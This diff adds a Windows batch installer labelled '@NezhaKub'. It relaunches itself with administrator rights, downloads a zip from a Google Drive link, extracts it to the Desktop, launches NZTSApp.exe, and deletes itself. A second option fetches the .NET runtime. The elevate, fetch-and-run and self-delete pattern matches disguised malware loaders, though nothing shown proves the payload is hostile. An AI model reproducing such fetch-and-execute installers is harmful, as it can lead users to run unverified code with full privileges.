@@ -1,0 +1,117 @@
+��&cls
+cls
+@shift /0
+@shift /0
+@echo off
+Mode 70,10
+chcp 65001 >nul
+color 5
+title @NezhaKub
+:: Rus as 
+    Reg.exe add HKLM /F >nul 2>&1
+    if %errorlevel% neq 0 start "" /wait /I /min powershell -NoProfile -Command start -verb runas "'%~s0'" && exit /b
+
+:lobby
+cls
+sleep 800
+title @NezhaKub
+Mode 70,10
+chcp 65001
+color 5
+cls    
+ECHO.	  
+ECHO.             install program
+ECHO.                                                                                 
+ECHO.   [1] Nezha                 [2]  Please select !!
+ECHO.                 
+ECHO.                    
+set /P Code="   START TO OPTION  = 
+if /i "%Code%"=="1" goto:nezhaeiei
+if /i "%Code%"=="2" goto:testeiei
+
+:runnumberfail
+cls
+Mode 70,10
+goto:lobby
+
+:nezhaeiei
+cls
+Mode 70,10
+color 5
+    echo.    
+    echo.    
+    echo.
+    echo.
+    echo.
+    echo.
+    echo.    
+    echo.    
+    echo.   ██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     
+    echo.   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     
+    echo.   ██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     
+    echo.   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     
+    echo.   ██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗
+    echo.   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
+cd C:\Users\Public\Pictures
+powershell -Command "Invoke-WebRequest -Uri 'https://drive.usercontent.google.com/download?id=1a-ebHZQDmKL4tm47-3U2_PCYsZW35tP-&export=download&authuser=0&confirm=t&uuid=c092490a-28d5-47c9-8250-0fe37ec71dce&at=ALWLOp5X_GxvajoNMvbhnK1lTVB6%3A1763986403694' -OutFile 'C:/Users/Public/Videos/NZTS.zip'"
+
+timeout 3
+
+set zipfile="C:\Users\Public\Videos\NZTS.zip"
+set outdir="%USERPROFILE%\Desktop"
+
+
+if not exist %outdir% (
+    mkdir %outdir%
+)
+
+tar -xf %zipfile% -C %outdir%
+
+if %ERRORLEVEL% NEQ 0 (
+    echo ❌ 
+    pause
+    exit /b
+)
+
+
+del %zipfile%
+
+timeout 1
+
+cd %USERPROFILE%\Desktop\NZTS
+start NZTSApp.exe
+
+@echo off
+cd C:/Users/Public/Videos/
+timeout /t 1 >nul
+del "%~f0"
+
+
+:testeiei
+cls
+Mode 70,10
+color 5
+    echo.    
+    echo.    
+    echo.
+    echo.
+    echo.
+    echo.
+    echo.    
+    echo.    
+    echo.   ██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     
+    echo.   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     
+    echo.   ██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     
+    echo.   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     
+    echo.   ██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗
+    echo.   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
+cd C:\Users\Public\Pictures
+powershell -Command "Invoke-WebRequest -Uri 'https://builds.dotnet.microsoft.com/dotnet/WindowsDesktop/8.0.22/windowsdesktop-runtime-8.0.22-win-x64.exe' -OutFile 'C:\Users\Public\Pictures\runtime.exe'"
+start runtime.exe
+timeout 5
+pause
+cls
+goto:lobby
+
+
+
